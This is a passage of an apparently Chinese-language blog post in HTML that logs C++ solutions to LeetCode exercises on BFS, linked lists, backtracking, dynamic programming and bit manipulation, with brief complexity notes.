class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">orangesRotting</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        <span class="hljs-comment">//以腐烂橘子第一层进行广度优先搜索</span><br>        <span class="hljs-type">int</span> row_size=grid.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> col_size=grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        queue&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt; q;<br>        <span class="hljs-comment">//腐烂时间</span><br>        <span class="hljs-type">int</span> t[row_size][col_size];<br>        <span class="hljs-built_in">memset</span>(t,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(t));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;row_size;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;col_size;j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(grid[i][j]==<span class="hljs-number">2</span>)<br>                &#123;<br>                    <span class="hljs-comment">//emplace 可以直接传入构造对象需要的元素， 然后自己调用其构造函数</span><br>                    q.<span class="hljs-built_in">emplace</span>(i,j);<br>                    t[i][j]=<span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;,dy[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-keyword">auto</span> [x,y]=q.<span class="hljs-built_in">front</span>();<br>            q.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>            &#123;<br>                <span class="hljs-type">int</span> newx=x+dx[i];<br>                <span class="hljs-type">int</span> newy=y+dy[i];<br>                <span class="hljs-keyword">if</span>(newx&gt;=<span class="hljs-number">0</span>&amp;&amp;newx&lt;row_size&amp;&amp;newy&gt;=<span class="hljs-number">0</span>&amp;&amp;newy&lt;col_size&amp;&amp;grid[newx][newy]==<span class="hljs-number">1</span>)<br>                &#123;<br>                    <span class="hljs-comment">//腐烂并更新时间</span><br>                    grid[newx][newy]=<span class="hljs-number">2</span>;<br>                    t[newx][newy]=t[x][y]+<span class="hljs-number">1</span>;<br>                    ans=<span class="hljs-built_in">max</span>(ans,t[newx][newy]);<br>                    q.<span class="hljs-built_in">emplace</span>(newx,newy);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;row_size;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;col_size;j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(grid[i][j]==<span class="hljs-number">1</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><h2 id="第-10-天-递归-回溯"><a href="#第-10-天-递归-回溯" class="headerlink" title="第 10 天 递归 / 回溯"></a>第 10 天 递归 / 回溯</h2><h3 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21. 合并两个有序链表"></a><a href="https://leetcode.cn/problems/merge-two-sorted-lists/">21. 合并两个有序链表</a></h3><p>将两个升序链表合并为一个新的 <strong>升序</strong> 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode* list1, ListNode* list2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(list1==<span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> list2;<br>        <span class="hljs-keyword">if</span>(list2==<span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> list1;<br>        <span class="hljs-keyword">if</span>(list1-&gt;val&lt;list2-&gt;val)  <span class="hljs-comment">//留下小的(返回头节点即可)</span><br>        &#123;<br>            list1-&gt;next=<span class="hljs-built_in">mergeTwoLists</span>(list1-&gt;next,list2);<br>            <span class="hljs-keyword">return</span> list1;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            list2-&gt;next=<span class="hljs-built_in">mergeTwoLists</span>(list1,list2-&gt;next);<br>            <span class="hljs-keyword">return</span> list2;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n+m)，其中n、m分别为两链表长度</li><li>递归，链表</li></ul><h3 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206. 反转链表"></a><a href="https://leetcode.cn/problems/reverse-linked-list/">206. 反转链表</a></h3><p>给你单链表的头节点 <code>head</code> ，请你反转链表，并返回反转后的链表。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* res=<span class="hljs-literal">NULL</span>;<br>        ListNode* cur=head;<br>        <span class="hljs-keyword">while</span>(cur!=<span class="hljs-literal">NULL</span>)<br>        &#123;<br>            ListNode* temp=cur;<br>            cur=cur-&gt;next;<br>            temp-&gt;next=res;<br>            res=temp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><h2 id="第-11-天-递归-回溯"><a href="#第-11-天-递归-回溯" class="headerlink" title="第 11 天 递归 / 回溯"></a>第 11 天 递归 / 回溯</h2><h3 id="77-组合"><a href="#77-组合" class="headerlink" title="77. 组合"></a><a href="https://leetcode.cn/problems/combinations/">77. 组合</a></h3><p>给定两个整数 <code>n</code> 和 <code>k</code>，返回范围 <code>[1, n]</code> 中所有可能的 <code>k</code> 个数的组合。</p><p>你可以按 <strong>任何顺序</strong> 返回答案。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br>    <span class="hljs-type">int</span> num_max,len_max;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addNumber</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; vec,<span class="hljs-type">int</span> num)</span></span><br><span class="hljs-function">    </span>&#123;<br>        vec.<span class="hljs-built_in">push_back</span>(num);<br>        <span class="hljs-keyword">if</span>(vec.<span class="hljs-built_in">size</span>()==len_max)<br>            ans.<span class="hljs-built_in">push_back</span>(vec);<br>        <span class="hljs-comment">//回溯+减枝</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(num&lt;num_max&amp;&amp;num_max-num&gt;=len_max-vec.<span class="hljs-built_in">size</span>())<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=num+<span class="hljs-number">1</span>;i&lt;=num_max;i++)<br>            &#123;<br>                <span class="hljs-built_in">addNumber</span>(vec,i);<br>            &#125;<br>        &#125;<br>    &#125;<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">combine</span>(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k) &#123;<br>        num_max=n;<br>        len_max=k;<br>        vector&lt;<span class="hljs-type">int</span>&gt; vec;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=num_max-len_max+<span class="hljs-number">1</span>;i++)<br>            <span class="hljs-built_in">addNumber</span>(vec,i);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>回溯</li><li>时间复杂度$O(C_n^k)$</li></ul><h3 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a href="https://leetcode.cn/problems/permutations/">46. 全排列</a></h3><p>给定一个不含重复数字的数组 <code>nums</code> ，返回其 <em>所有可能的全排列</em> 。你可以 <strong>按任意顺序</strong> 返回答案。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> len_max;<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br>    unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; used;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; vec,vector&lt;<span class="hljs-type">int</span>&gt; nums,unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; used,<span class="hljs-type">int</span> len_max)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(vec.<span class="hljs-built_in">size</span>()==len_max)<br>        &#123;<br>            ans.<span class="hljs-built_in">push_back</span>(vec);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len_max;i++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(used[i]==<span class="hljs-number">0</span>)<br>                &#123;<br>                    vec.<span class="hljs-built_in">push_back</span>(nums[i]);<br>                    used[i]=<span class="hljs-number">1</span>;<br>                    <span class="hljs-built_in">backtrack</span>(vec,nums,used,len_max);<br>                    used[i]=<span class="hljs-number">0</span>;<br>                    vec.<span class="hljs-built_in">pop_back</span>();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">permute</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>        len_max=nums.<span class="hljs-built_in">size</span>();<br>        vector&lt;<span class="hljs-type">int</span>&gt; vec;<br>        <span class="hljs-built_in">backtrack</span>(vec,nums,used,len_max);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li><p>数组，回溯</p></li><li><p>时间复杂度$O(n*n!)$</p></li></ul><h3 id="784-字母大小写全排列"><a href="#784-字母大小写全排列" class="headerlink" title="784. 字母大小写全排列"></a><a href="https://leetcode.cn/problems/letter-case-permutation/">784. 字母大小写全排列</a></h3><p>给定一个字符串 <code>s</code> ，通过将字符串 <code>s</code> 中的每个字母转变大小写，我们可以获得一个新的字符串。</p><p>返回 <em>所有可能得到的字符串集合</em> 。以 <strong>任意顺序</strong> 返回输出。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;string&gt; ans;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">backTrack</span><span class="hljs-params">(string S,<span class="hljs-type">int</span> i)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(i==S.<span class="hljs-built_in">size</span>())<br>        &#123;<br>            ans.<span class="hljs-built_in">push_back</span>(S);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isalpha</span>(S[i]))<br>            <span class="hljs-built_in">backTrack</span>(S,i+<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            S[i]=<span class="hljs-built_in">tolower</span>(S[i]);<br>            <span class="hljs-built_in">backTrack</span>(S,i+<span class="hljs-number">1</span>);<br>            S[i]=<span class="hljs-built_in">toupper</span>(S[i]);<br>            <span class="hljs-built_in">backTrack</span>(S,i+<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">letterCasePermutation</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-built_in">backTrack</span>(s,<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(2^k)$，k为字母个数</li></ul><h2 id="第-12-天-动态规划"><a href="#第-12-天-动态规划" class="headerlink" title="第 12 天 动态规划"></a>第 12 天 动态规划</h2><h3 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="70. 爬楼梯"></a><a href="https://leetcode.cn/problems/climbing-stairs/">70. 爬楼梯</a></h3><p>假设你正在爬楼梯。需要 <code>n</code> 阶你才能到达楼顶。</p><p>每次你可以爬 <code>1</code> 或 <code>2</code> 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//递推公式 dp[i]=dp[i-1]+dp[i-2]</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">climbStairs</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(n&lt;=<span class="hljs-number">2</span>)<br>            <span class="hljs-keyword">return</span> n;<br>        <span class="hljs-type">int</span> dp[<span class="hljs-number">2</span>];<br>        dp[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>        dp[<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">3</span>;i&lt;=n;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> sum=dp[<span class="hljs-number">0</span>]+dp[<span class="hljs-number">1</span>];<br>            dp[<span class="hljs-number">0</span>]=dp[<span class="hljs-number">1</span>];<br>            dp[<span class="hljs-number">1</span>]=sum;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dp[<span class="hljs-number">1</span>];<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度O(n),空间复杂度O(1)</li><li>记忆化搜索，数学，动态规划</li></ul><h3 id="198-打家劫舍"><a href="#198-打家劫舍" class="headerlink" title="198. 打家劫舍"></a><a href="https://leetcode.cn/problems/house-robber/">198. 打家劫舍</a></h3><p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。</p><p>给定一个代表每个房屋存放金额的非负整数数组，计算你 不触动警报装置的情况下 ，一夜之内能够偷窃到的最高金额。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>      <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>      <span class="hljs-type">int</span> len=nums.<span class="hljs-built_in">size</span>();<br>      <span class="hljs-keyword">if</span>(len==<span class="hljs-number">1</span>)<br>      &#123;<br>          <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>];<br>      &#125;<br>      <span class="hljs-keyword">if</span>(len==<span class="hljs-number">2</span>)<br>      &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(nums[<span class="hljs-number">0</span>],nums[<span class="hljs-number">1</span>]);<br>      &#125;<br>      <span class="hljs-type">int</span> dp[<span class="hljs-number">3</span>];<br>      dp[<span class="hljs-number">0</span>]=nums[<span class="hljs-number">0</span>];<br>      dp[<span class="hljs-number">1</span>]=nums[<span class="hljs-number">1</span>];<br>      dp[<span class="hljs-number">2</span>]=nums[<span class="hljs-number">0</span>]+nums[<span class="hljs-number">2</span>];<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">3</span>;i&lt;len;i++)<br>      &#123;<br>          <span class="hljs-type">int</span> temp0=dp[<span class="hljs-number">1</span>];<br>          <span class="hljs-type">int</span> temp1=dp[<span class="hljs-number">2</span>];<br>          dp[<span class="hljs-number">2</span>]=<span class="hljs-built_in">max</span>(<span class="hljs-built_in">max</span>(dp[<span class="hljs-number">0</span>],dp[<span class="hljs-number">1</span>])+nums[i],dp[<span class="hljs-number">2</span>]);<br>          dp[<span class="hljs-number">0</span>]=temp0;<br>          dp[<span class="hljs-number">1</span>]=temp1;<br>      &#125;  <br>      ans=<span class="hljs-built_in">max</span>(<span class="hljs-built_in">max</span>(dp[<span class="hljs-number">0</span>],dp[<span class="hljs-number">1</span>]),dp[<span class="hljs-number">2</span>]);<br>      <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度O(n),空间复杂度O(1)</li><li>数组，动态规划</li></ul><h3 id="120-三角形最小路径和"><a href="#120-三角形最小路径和" class="headerlink" title="120. 三角形最小路径和"></a><a href="https://leetcode.cn/problems/triangle/">120. 三角形最小路径和</a></h3><p>给定一个三角形 triangle ，找出自顶向下的最小路径和。</p><p>每一步只能移动到下一行中相邻的结点上。相邻的结点 在这里指的是 下标 与 上一层结点下标 相同或者等于 上一层结点下标 + 1 的两个结点。也就是说，如果正位于当前行的下标 i ，那么下一步可以移动到下一行的下标 i 或 i + 1 。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//自底向上计算最短路径和</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minimumTotal</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; triangle)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=triangle.<span class="hljs-built_in">size</span>()<span class="hljs-number">-2</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;triangle[i].<span class="hljs-built_in">size</span>();j++)<br>            &#123;<br>                triangle[i][j]+=<span class="hljs-built_in">min</span>(triangle[i+<span class="hljs-number">1</span>][j],triangle[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> triangle[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度O(n),n=triangle.size()</li><li>数组，动态规划</li></ul><h2 id="第-13-天-位运算"><a href="#第-13-天-位运算" class="headerlink" title="第 13 天 位运算"></a>第 13 天 位运算</h2><h3 id="231-2-的幂"><a href="#231-2-的幂" class="headerlink" title="231. 2 的幂"></a><a href="https://leetcode.cn/problems/power-of-two/">231. 2 的幂</a></h3><p>给你一个整数 n，请你判断该整数是否是 2 的幂次方。如果是，返回 true ；否则，返回 false 。</p><p>如果存在一个整数 x 使得 n == 2^x ，则认为 n 是 2 的幂次方。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPowerOfTwo</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> n&gt;<span class="hljs-number">0</span> &amp;&amp; !(n&amp;(n<span class="hljs-number">-1</span>)); <br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度O(1)</li><li>位运算,递归,数学</li></ul><h3 id="191-位1的个数"><a href="#191-位1的个数" class="headerlink" title="191. 位1的个数"></a><a href="https://leetcode.cn/problems/number-of-1-bits/">191. 位1的个数</a></h3><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">hammingWeight</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> n)</span> </span>&#123;<br>        <span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(n)<br>        &#123;<br>            cnt+=n&amp;<span class="hljs-number">1</span>;<br>            n&gt;&gt;=<span class="hljs-number">1</span>;<br>        &#125; <br>        <span 